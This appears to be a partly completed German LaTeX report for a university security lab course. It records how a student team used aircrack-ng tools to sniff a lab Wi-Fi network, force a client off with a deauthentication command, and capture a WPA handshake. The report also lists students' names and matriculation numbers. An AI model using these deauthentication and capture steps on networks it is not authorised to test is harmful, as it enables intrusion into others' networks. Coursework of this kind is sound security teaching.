@@ -1,0 +1,298 @@
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%
+% Institut für Rechnergestuetzte Automation
+% Forschungsgruppe Industrial Software
+% Arbeitsgruppe ESSE
+% https://security.inso.tuwien.ac.at/
+% lva.security@inso.tuwien.ac.at
+%
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+
+\documentclass[12pt,a4paper,titlepage,oneside]{scrartcl}
+\newcommand{\lang}{de}
+\usepackage{esseProtocol}
+
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%
+% FOR STUDENTS
+%
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+
+% Team number or "0" for Lab0
+%TODO team number
+\newcommand{\team}{66}
+% Date
+%TODO fill in creation date
+\newcommand{\datum}{23.11.2018}
+%TODO lab number
+% valid values: "Lab0", "Lab1" (be sure to use Uppercase for first character)
+\newcommand{\lab}{Lab1}
+
+%TODO name of course
+\newcommand{\lvaname}{Introduction to Security}
+%TODO number of course
+\newcommand{\lvanr}{183.594}
+%TODO year and term, for example: "SS 2012", "WS 2012", "SS 2013", etc.
+\newcommand{\semester}{WS 2018}
+
+% Student data in Lab0 or 1. student of team in Lab1
+\newcommand{\studentAName}{Bernhard Ploder}
+\renewcommand{\studentAMatrnr}{01627766}
+
+% 2. student of team in Lab1, for Lab0 or if your team has less students, remove these 2 lines
+\newcommand{\studentBName}{Marco Fähndrich}
+\renewcommand{\studentBMatrnr}{01625748}
+
+% 3. student of team in Lab1, for Lab0 or if your team has less students, remove these 2 lines
+\newcommand{\studentCName}{Dominik Fenzl}
+\renewcommand{\studentCMatrnr}{01526544}
+
+% 4. student of team in Lab1, for Lab0 or if your team has less students, remove these 2 lines
+\newcommand{\studentDName}{Alexander Hurbean}
+\renewcommand{\studentDMatrnr}{01625747}
+
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%
+% DO NOT CHANGE THE FOLLOWING PART
+%
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+
+\newcommand{\colormode}{color}
+\newcommand{\dokumenttyp}{Abgabedokument \lab}
+
+\begin{document}
+
+\maketitle
+\setcounter{section}{0}
+\setcounter{tocdepth}{2}
+\tableofcontents
+
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%
+% CONTENT OF DOCUMENT STARTS HERE
+%
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+
+\section{Forensik}
+
+\subsection{Lizenzvertrag}
+\emph{TO BE DONE}
+
+\subsection{Lizenz-Nachzahlung}
+\emph{TO BE DONE}
+
+\subsection{Lizenz-Notiz}
+\emph{TO BE DONE}
+
+\subsection{Appendix \#07}
+\emph{TO BE DONE}
+
+\subsection{Appendix \#04}
+\emph{TO BE DONE}
+
+\subsection{Lizenz-Berechtigung}
+\emph{TO BE DONE}
+
+\subsection{Crypto-Ref-ID}
+\emph{TO BE DONE}
+
+\section{Intranet}
+
+\subsection{Netzwerkkarten Setup}
+Um die Intranet Aufgaben zu lösen haben wir beim ersten TimeSlot alle zusammen geschaut alle nötigen Pakete mit der aircrack-ng Suite abzufangen. Dafür sind wir dem Tutorial auf der \href{https://www.aircrack-ng.org/doku.php?id=cracking_wpa}{aircrack-ng} Wiki gefolgt.
+
+Wir haben zu aller erst geschaut welche W-Lan fähigen Interfaces wir haben:
+
+\begin{lstlisting}
+is_team66@debian:~$ iwconfig
+  lo	  no wireless extensions.
+  
+  wlp3s0	  IEEE 802.11  Mode:Monitor  Frequency:2.412 GHz  Tx-Power=15 dBm
+      Retry short limit:7	RTS thr:off   Fragment thr:off
+      Power Management:off
+  
+  ens1	  no wireless extensions.
+  
+  irda0	  no wireless extensions.
+\end{lstlisting}
+
+Anschließend haben wir sie in den Monitor Modus umgeschaltet damit sie auch Pakete empfangen/aufnehmen kann die nicht an sie gerichtet sind.
+
+\begin{lstlisting}
+is_team66@debian:~$ sudo airmon-ng start wlp3s0
+  PHY	Interface	Driver		Chipset
+  
+  phy0	wlp3s0		iwl3945 	Intel Corporation PRO/Wireless 3945ABG [Golan] (rev 02)
+\end{lstlisting}
+
+Dann haben wir geschaut ob die Netzwerkkarte Injection ünterstüzt mit dem Befehl
+
+\begin{lstlisting}
+  is_team66@debian:~$ sudo aireplay-ng -9 wlp3s0
+  14:12:27  Trying broadcast probe requests..
+  14:12:27  Injection is working!
+  14:12:28  Found 10 APs
+  
+  14:12:28  Trying directed probe requests...
+  14:12:28  04:18:D6:17:78:80 - channel: 1 - 'INSO'
+  14:12:2900Ping (min/avg/max): 1.284ms/11.915ms/144.130ms Power: -50.67
+  14:12:29  30/30: 100%
+  
+  .
+  .
+  
+  14:12:40  00:18:39:BF:D7:66 - channel: 1 - 'SecureHotDog'
+  14:12:4100Ping (min/avg/max): 0.781ms/4.219ms/39.155ms Power: -31.60
+  14:12:41  30/30: 100%
+  
+  14:12:41  02:18:39:BF:D7:67 - channel: 1 - 'HotDog'
+  14:12:4100Ping (min/avg/max): 1.036ms/6.279ms/54.140ms Power: -27.33
+  14:12:41  30/30: 100%
+  
+  .
+  .
+\end{lstlisting}
+
+\subsection{airodump-ng HotDog}
+Anschließend haben wir mit airodump-ng versucht Pakete abzugreifen oder einfach hinzulauschen was so passiert und haben nach 2 Minuten folgenden Output gehabt:
+
+\begin{lstlisting}
+is_team66@debian:~$ sudo airodump-ng wlp3s0
+
+  CH  1 ][ Elapsed: 2 mins ][ 2018-11-23 14:29
+
+ BSSID		    PWR RXQ  Beacons	#Data, #/s  CH	MB   ENC  CIPHER AUTH ESSID
+
+ 02:18:39:BF:D7:67  -26  61	1391	    0	 0   1	54   OPN	      HotDog
+ 00:18:39:BF:D7:66  -24  51	1389	    4	 0   1	54   WPA  TKIP	 PSK  SecureHotDog
+
+ BSSID		    STATION	       PWR   Rate    Lost    Frames  Probe
+
+ 02:18:39:BF:D7:67  74:DA:38:F0:40:C2  -28    1 - 1	 0	 24
+ 02:18:39:BF:D7:67  74:DA:38:F0:41:1C  -34    1 -24	 0	 26
+ 02:18:39:BF:D7:67  80:1F:02:AB:A9:9C  -37    1 - 1	 0	 26
+ 02:18:39:BF:D7:67  80:1F:02:AB:A9:9B  -52    1 -24	 0	 26
+ 00:18:39:BF:D7:66  80:1F:02:AB:A9:9E  -32    1 -24	 0	 45
+ 00:18:39:BF:D7:66  80:1F:02:AB:A9:86  -42    1 -24	 0	 19
+ 
+\end{lstlisting}
+
+Da uns im Moment eigentlich nur der HotDog interessiert hat, haben wir versucht mit der \lstinline{-e} Option den HotDog zu filtern, ist uns aber nicht gelungen weil die vorhandene Version von airodump-ng das nicht unterstützt hat.
+Wir haben den selben Befehl länger laufen lassen (10 Minuten) und sind so zu unseren pcap Files gekommen die die nötigen Daten enthalten um den Verkehr von HotDog zu untersuchen.
+
+\subsection{VoIP}
+
+Wir haben die abgefangenen Pakete (in der \lstinline{.cap} Datei von \lstinline{airodump-ng})
+
+\subsection{E-Mail}
+\emph{TO BE DONE}
+
+\subsection{IRC}
+\emph{TO BE DONE}
+
+\subsection{FTP}
+\emph{TO BE DONE}
+
+\subsection{FTP 2}
+\emph{TO BE DONE}
+
+\subsection{WLAN-Passwort}
+
+Um an die Hashes des WPA-Passwortes zu kommen haben wir durch das oben angegebene Tutorial herausgefunden dass man mit \lstinline{airodump-ng -w psk wlp3s0} den nötigen Handshake abfangen kann. Dafür muss sich aber ein Client beim Router authentifizieren, worauf wir 10 Minuten lang gewartet haben, aber leider keinen Handshake abgefangen haben. Ein paar Minuten später haben wir herausgefunden, dass wir einen Client deauhentifizieren können mit \lstinline{aireplay-ng -0 1 -a  00:18:39:BF:D7:66 -c 80:1F:02:AB:A9:9E wlp3s0} wo die erste MAC Addresse die vom SecureHotDog ist und die zweite eine von den zwei Clients die wir beobachtet haben.
+
+Als Ergebnis hatten wir anschließend rechts oben sichtbar einen WPA handshake abgefangen für SecureHotDog:
+
+\begin{lstlisting}
+  CH  1 ][ Elapsed: 7 mins ][ 2018-11-23 15:05 ][ WPA handshake: 00:18:39:BF:D7:66
+
+  BSSID		    PWR RXQ  Beacons	#Data, #/s  CH	MB   ENC  CIPHER AUTH ESSID
+ 
+  02:18:39:BF:D7:67  -32  50	4319	  830	 0   1	54   OPN	      HotDog
+  00:18:39:BF:D7:66  -32  54	4320	  359	 0   1	54   WPA  TKIP	 PSK  SecureHotDog
+ 
+  BSSID		    STATION	       PWR   Rate    Lost    Frames  Probe
+ 
+  02:18:39:BF:D7:67  74:DA:38:F0:40:C2  -29    1 -24	 0	482
+  02:18:39:BF:D7:67  74:DA:38:F0:41:1C  -33    1 -24	 0	344
+  02:18:39:BF:D7:67  80:1F:02:AB:A9:9C  -43    1 -24	 0	281
+  02:18:39:BF:D7:67  80:1F:02:AB:A9:9B  -45    1 -24	 0	228
+  00:18:39:BF:D7:66  80:1F:02:AB:A9:9E  -40    1 -24	 0	392
+  00:18:39:BF:D7:66  80:1F:02:AB:A9:86  -43   54 -24	 0	256
+\end{lstlisting}
+
+\subsection{HTTPS}
+\emph{TO BE DONE}
+
+\section{Manager9000}
+
+\subsection{Schwachstelle finden}
+\emph{TO BE DONE}
+
+\subsection{Wer schürft am meisten?}
+\emph{TO BE DONE}
+
+\subsection{Mein Wallet}
+\emph{TO BE DONE}
+
+\subsection{CEO's key}
+\emph{TO BE DONE}
+
+\section{Scriptkiddie 101}
+
+\subsection{Kompromitierte Sicherheit}
+
+\subsection{Proof of Work}
+
+\subsection{Matryoshka}
+
+\subsection{Unforgettable}
+
+\subsection{Kompromitiert \& Kompromittiert}
+
+\section{Beispiele}
+
+\subsection{Source Code formatieren}
+Es folgen einige Beispiele wie Sourcecode in diesem Dokument formatiert und referenziert werden kann
+(\hyperref[code:beispiel1]{siehe Listing~\ref*{code:beispiel1} auf Seite~\pageref*{code:beispiel1}} und \hyperref[code:beispiel2]{siehe Listing~\ref*{code:beispiel2} auf Seite~\pageref*{code:beispiel2}}).
+
+Ebenso können kurzer Code oder kurze Befehle direkt in der Zeile in einem \lstinline{lstinline Block} mit typengleicher Schrift formatiert werden.
+
+\lstinputlisting[caption=Example C/C++ file,label=code:beispiel1,style=c]{example.c}
+
+\begin{lstlisting}[caption=Example bash script,label=code:beispiel2,style=simple]
+#!/bin/bash
+echo "Bash version ${BASH_VERSION}..."
+for i in {0..10..2}
+  do
+     echo "Welcome $i times"
+ done
+
+echo "some very very very very very very very very very very very very very very very very very very very very long string"
+
+exit 0;
+\end{lstlisting}
+
+\subsection{Bilder}
+
+Es folgen einige Beispiele wie Bilder in diesem Dokument eingefuegt werden koennen
+(\hyperref[fig:logo1]{siehe Abbildung~\ref*{fig:logo1} auf Seite~\pageref*{fig:logo1}}).
+
+\begin{figure}[h!]
+  \centering
+  \fbox{
+    \includegraphics[width=0.4\textwidth]{./imgs/logos/esse-logo-color.png}
+  }
+  \caption{ESSE Logo}
+  \label{fig:logo1}
+\end{figure}
+
+
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%
+% DO NOT CHANGE THE FOLLOWING PART
+%
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+
+\end{document}
+
+
